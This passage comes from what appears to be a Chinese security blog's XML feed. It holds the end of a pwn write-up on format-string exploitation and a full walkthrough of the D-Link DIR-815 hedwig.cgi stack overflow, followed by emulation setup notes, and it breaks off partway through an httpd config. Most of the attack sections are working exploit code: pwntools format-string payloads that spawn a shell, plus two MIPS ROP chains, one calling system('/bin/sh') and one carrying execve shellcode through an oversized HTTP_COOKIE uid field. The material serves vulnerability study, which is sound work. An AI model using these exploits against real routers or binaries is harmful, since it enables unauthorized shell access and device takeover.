class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#4,5,6 &#x27;sh&#x27;写入栈,修改rbp,把rbp+0x3e-4 链入并置0</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%8$n\x00&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x6873</span>).encode() <span class="comment"># 1 canshuxieshangl</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">0x58</span>).encode()</span><br><span class="line">payload+= <span class="string">&#x27;%&#123;&#125;c%6$hn\x00&#x27;</span>.<span class="built_in">format</span>((<span class="number">0x38</span>+<span class="number">0xe</span>-<span class="number">4</span>-<span class="number">0x58</span>+<span class="number">0x10000</span>)%<span class="number">0x10000</span>).encode() <span class="comment"># 0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">5</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%47$n\x00&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x00</span>).<span class="built_in">format</span>() <span class="comment"># 1</span></span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">######7 把rbp再次链入</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%6$hn\x00&#x27;</span>.<span class="built_in">format</span>(rbp_low).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#####8 修改rbp 为rbp_low+0x38+0xe</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%47$hn\x00&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">0x38</span>+<span class="number">0xe</span>).encode()</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x401332&quot;</span>)</span><br><span class="line"><span class="comment">##### 9 把rbp+8 链入</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%6$hn\x00&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">8</span>).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">##### 10 修改返回地址</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x1274</span>).encode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">payload +=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="优雅至极"><a href="#优雅至极" class="headerlink" title="优雅至极"></a>优雅至极</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class="line">io,elf=loadfile(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x401332&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 leak stack</span></span><br><span class="line">payload=<span class="string">b&quot;%8$p&quot;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"><span class="comment">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class="line">rbp_low=rbp &amp; <span class="number">0xffff</span></span><br><span class="line">fmt_low=<span class="number">0x4040c0</span> &amp; <span class="number">0xffff</span></span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2 gouzao </span></span><br><span class="line">payload =  <span class="string">b&quot;%p&quot;</span> * <span class="number">4</span> </span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">0x20</span>-<span class="number">0x4</span>-<span class="number">40</span>).encode()</span><br><span class="line">payload+= <span class="string">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class="built_in">format</span>((<span class="number">0x6873</span>-(rbp_low+<span class="number">0x20</span>)+<span class="number">0xe</span>)).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 </span></span><br><span class="line">payload = <span class="string">b&quot;%p&quot;</span> *<span class="number">4</span> </span><br><span class="line">payload+= <span class="string">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">0x12</span>-<span class="number">40</span>).encode()</span><br><span class="line">payload+= <span class="string">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class="built_in">format</span>((<span class="number">0x1274</span>-(rbp_low+<span class="number">0x38</span>)+<span class="number">0x30</span>+<span class="number">0x10000</span>)%<span class="number">0x10000</span>).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 非栈上格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DIR-815 栈溢出漏洞</title>
      <link href="/2025/08/12/Iot/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/08/12/Iot/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="DIR-815-栈溢出漏洞"><a href="#DIR-815-栈溢出漏洞" class="headerlink" title="DIR-815 栈溢出漏洞"></a>DIR-815 栈溢出漏洞</h1><h2 id="环境工具准备"><a href="#环境工具准备" class="headerlink" title="环境工具准备"></a>环境工具准备</h2><h3 id="sasquatch"><a href="#sasquatch" class="headerlink" title="sasquatch"></a>sasquatch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 安装依赖库文件</span><br><span class="line">sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev</span><br><span class="line"> </span><br><span class="line"># 下载源码</span><br><span class="line">git clone https://github.com/devttys0/sasquatch.git</span><br><span class="line"> </span><br><span class="line"># 源码的编译</span><br><span class="line">(cd sasquatch &amp;&amp; ./build.sh)</span><br></pre></td></tr></table></figure><h3 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h3><ol><li><a href="https://bbs.kanxue.com/elink@892K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3L8h3c8S2M7q4">DIR-815A1_FW101SSB03.bin</a></li><li><a href="https://rebyte.me/en/d-link/89510/file-592084/">File DIR-815_FIRMWARE_1.01.ZIP — Firmware for D-link DIR-815</a></li><li><a href="https://bbs.kanxue.com/thread-273684.htm">[下载]D-LINK路由器固件–DIR-815_FIRMWARE_1.01-安全工具-看雪-安全社区|安全招聘|kanxue.com</a></li></ol><h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me DIR-815.bin</span><br></pre></td></tr></table></figure><h2 id="二进制文件逆向分析"><a href="#二进制文件逆向分析" class="headerlink" title="二进制文件逆向分析"></a>二进制文件逆向分析</h2><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807175447631.png" alt="hedwig.cgi"></p><p>可以看见，<code>/htdocs/web/hedwig.cgi</code>是<code>/htdocs/cgibin</code>的软链接，因此，我们需要逆向分析的二进制文件是<code>/htdocs/cgibin</code></p><p>用ida9.0打开cgibin ，开始分析</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807192849832.png" alt="main"></p><p>在main函数中发现hedwigcgi，进入该函数分析</p><h3 id="hedwigcgi函数分析"><a href="#hedwigcgi函数分析" class="headerlink" title="hedwigcgi函数分析"></a>hedwigcgi函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807193447008.png" alt="hedwigcgi"></p><p>先获取环境环境变量，REQUEST_METHOD,当这个值为POST时，程序继续运行cgibin_parse_request()，进入该函数分析</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807194034588.png" alt="hedwigcgi"></p><p>发现似乎是解析获取环境变量的，返回上层函数，往下分析</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807194403775.png" alt="main"></p><p>接下来会执行sess_get_uid()函数，进入函数分析</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807195355928.png" alt="sess_get_uid"></p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807210059982.png" alt="sess_get_uid"></p><p>如果v2也就是”&#x3D;”前面的字符串是uid，就会把v4的值返回，返回上层函数继续分析</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807202727044.png" alt="main"></p><p>这里的string就是处理了uid之后的内容，sprintf 函数存在溢出的可能。</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807202901421.png" alt="main"></p><p>在函数后面，有个类似的sprinf，而且两个sprintf之间没有对v4 改变，所以v20和string是一样的。v27只有1024个字节大小，所以可以溢出。</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807213459396.png" alt="main"></p><p>因为haystack默认值为0，所以要控制它为1，才能不进入if。同时上面的路径要存在，否则也会进入if里。如何控制haystack呢？</p><h3 id="haystack变量控制分析"><a href="#haystack变量控制分析" class="headerlink" title="haystack变量控制分析"></a>haystack变量控制分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808144001612.png" alt="haystack"></p><p>通过交叉引用查看，发现在sub_409A6c中有对该变量的操作， 继续查看该函数的交叉引用</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808144244466.png" alt="main"></p><p>发现在cgibin_parse_request中有调用</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808151711845.png" alt="cgibin_parse_request"></p><p>在这里进行了调用，参数是a1是sub_409ac6,</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152204598.png" alt="off_42c014"></p><p>这个地址，第一次进循环就正确，此时应该调用的是sub_0x403b10函数，继续</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152327478.png" alt="sub_0x403b10"></p><p>调用了sub_402ffc 函数，继续进入分析</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152442511.png" alt="sub_402ffc"></p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152503518.png" alt="sub_402ffc"></p><p>这里会进一步调用sub_402b40函数，参数&amp;v11，这个地址与我们的v14相邻，而v14被赋值为了关键函数的地址。继续深入分析</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152908972.png" alt="sub_402b40"></p><p>a1就是刚才的&amp;v11，这里作为Dword指针，v9就是我们的sub_409A6c函数，参数也是刚才保存在栈上的数据。</p><p>因此，要执行到有溢出漏洞的地方必须满足<strong>环境变量<code>REQUEST_URI</code>中必须有内容</strong>，环境变量<code>CONTENT_TYPE</code>仍然是老规矩<code>application/x-www-form-urlencoded</code>，要是POST方法</p><h2 id="ROP链构造"><a href="#ROP链构造" class="headerlink" title="ROP链构造"></a>ROP链构造</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ol><li>先在var目录下创建一个tmp文件夹</li><li>mipsrop下载[[环境搭建 &amp; 工具]]</li></ol><h3 id="纯ROP"><a href="#纯ROP" class="headerlink" title="纯ROP"></a>纯ROP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">libc_base = 0x7F738000</span><br><span class="line"> </span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1</span><br><span class="line">payload += p32(libc_base + 0x159F4) # s1  move $t9, $s0 (=&gt; jalr $t9)</span><br><span class="line">payload += b&#x27;a&#x27;*4</span><br><span class="line">payload += p32(libc_base + 0x6DFD0) # s3  /bin/sh</span><br><span class="line">payload += b&#x27;a&#x27;*(4*2)</span><br><span class="line">payload += p32(libc_base + 0x32A98) # s6  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class="line">payload += b&#x27;a&#x27;*(4*2)</span><br><span class="line">payload += p32(libc_base + 0x13F8C) # ra  move $a0, $s3 (=&gt; jalr $s6)</span><br><span class="line"> </span><br><span class="line">payload = b&quot;uid=&quot; + payload</span><br><span class="line">post_content = &quot;peruy=pwner&quot;</span><br><span class="line">io = process(b&quot;&quot;&quot;</span><br><span class="line">    qemu-mipsel -L ./ \</span><br><span class="line">    -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">    -E CONTENT_LENGTH=11 \</span><br><span class="line">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\&quot; \</span><br><span class="line">    -E REQUEST_URI=&quot;2333&quot; \</span><br><span class="line">    ./htdocs/cgibin</span><br><span class="line">&quot;&quot;&quot;, shell = True)</span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="ROP-shellcode"><a href="#ROP-shellcode" class="headerlink" title="ROP + shellcode"></a>ROP + shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line"> </span><br><span class="line">libc_base = 0x7F738000</span><br><span class="line"> </span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += b&#x27;a&#x27;*4</span><br><span class="line">payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span><br><span class="line">payload += b&#x27;a&#x27;*4</span><br><span class="line">payload += p32(libc_base + 0x56BD0) # s3  sleep</span><br><span class="line">payload += b&#x27;a&#x27;*(4*5)</span><br><span class="line">payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=&gt; jalr $s1)</span><br><span class="line"> </span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += b&#x27;a&#x27;*(4*4)</span><br><span class="line">payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=&gt; jalr $t9)</span><br><span class="line">payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span><br><span class="line"> </span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    slti $a2, $zero, -1</span><br><span class="line">    li $t7, 0x69622f2f</span><br><span class="line">    sw $t7, -12($sp)</span><br><span class="line">    li $t6, 0x68732f6e</span><br><span class="line">    sw $t6, -8($sp)</span><br><span class="line">    sw $zero, -4($sp)</span><br><span class="line">    la $a0, -12($sp)</span><br><span class="line">    slti $a1, $zero, -1</span><br><span class="line">    li $v0, 4011</span><br><span class="line">    syscall 0x40404</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line">payload = b&quot;uid=&quot; + payload</span><br><span class="line">post_content = &quot;peruy=pwner&quot;</span><br><span class="line">io = process(b&quot;&quot;&quot;</span><br><span class="line">    qemu-mipsel -L ./ \</span><br><span class="line">    -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">    -E CONTENT_LENGTH=11 \</span><br><span class="line">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\&quot; \</span><br><span class="line">    -E REQUEST_URI=&quot;2333&quot; \</span><br><span class="line">    ./htdocs/cgibin</span><br><span class="line">&quot;&quot;&quot;, shell = True)</span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="虚拟机网络配置"><a href="#虚拟机网络配置" class="headerlink" title="虚拟机网络配置"></a>虚拟机网络配置</h2><h3 id="✅-步骤一：禁用-NetworkManager-对-eth0-和-br0-的管理"><a href="#✅-步骤一：禁用-NetworkManager-对-eth0-和-br0-的管理" class="headerlink" title="✅ 步骤一：禁用 NetworkManager 对 eth0 和 br0 的管理"></a>✅ 步骤一：禁用 NetworkManager 对 <code>eth0</code> 和 <code>br0</code> 的管理</h3><p>编辑或创建一个配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/NetworkManager/conf.d/99-unmanaged-devices.conf</span><br></pre></td></tr></table></figure><p>添加以下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[keyfile]</span></span><br><span class="line"><span class="attr">unmanaged-devices</span>=interface-name:eth0<span class="comment">;interface-name:br0</span></span><br></pre></td></tr></table></figure><p>保存后重启 NetworkManager：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart NetworkManager</span><br></pre></td></tr></table></figure><hr><h3 id="✅-步骤二：创建-Netplan-配置文件"><a href="#✅-步骤二：创建-Netplan-配置文件" class="headerlink" title="✅ 步骤二：创建 Netplan 配置文件"></a>✅ 步骤二：创建 Netplan 配置文件</h3><p>备份原来的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> /etc/netplan/01-network-manager-all.yaml /etc/netplan/01-network-manager-all.yaml.bak</span><br></pre></td></tr></table></figure><p>创建新配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/netplan/01-bridge.yaml</span><br></pre></td></tr></table></figure><p>内容如下（根据你实际接口名修改，比如 <code>ens33</code> 换成 <code>eth0</code>）：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">network:</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">renderer:</span> <span class="string">networkd</span></span><br><span class="line">  <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">eth0:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line">  <span class="attr">bridges:</span></span><br><span class="line">    <span class="attr">br0:</span></span><br><span class="line">      <span class="attr">interfaces:</span> [<span class="string">eth0</span>]</span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">yes</span></span><br><span class="line">      <span class="attr">parameters:</span></span><br><span class="line">        <span class="attr">stp:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">forward-delay:</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><blockquote><p>⚠️ 注意：<br>如果你虚拟机里的接口名是 <code>ens33</code> 而不是 <code>eth0</code>，请把上面两处 <code>eth0</code> 改成 <code>ens33</code>。</p></blockquote><hr><h3 id="✅-步骤三：应用配置"><a href="#✅-步骤三：应用配置" class="headerlink" title="✅ 步骤三：应用配置"></a>✅ 步骤三：应用配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netplan apply</span><br></pre></td></tr></table></figure><hr><h3 id="✅-验证"><a href="#✅-验证" class="headerlink" title="✅ 验证"></a>✅ 验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip addr show br0</span><br><span class="line">ip route</span><br></pre></td></tr></table></figure><p>你应该能看到 <code>br0</code> 拿到了 DHCP 地址，<code>eth0</code> 没有 IP。</p><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p><a href="https://people.debian.org/~aurel32/qemu/mipsel/">https://people.debian.org/~aurel32/qemu/mipsel/</a><br>下载其中的<code>vmlinux-3.2.0-4-4kc-malta</code>内核以及<code>debian_squeeze_mipsel_standard.qcow2</code>镜像文件</p><h2 id="qemu系统下"><a href="#qemu系统下" class="headerlink" title="qemu系统下"></a>qemu系统下</h2><h3 id="启动脚本"><a href="#启动脚本" class="headerlink" title="启动脚本"></a>启动脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap</span><br></pre></td></tr></table></figure><h3 id="http-cond"><a href="#http-cond" class="headerlink" title="http_cond"></a>http_cond</h3><p>在qemu 中 &#x2F;root&#x2F;squashfs-root&#x2F; 下创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #开启log</span><br><span class="line">ErrorLog /log #log文件</span><br><span class="line"> </span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    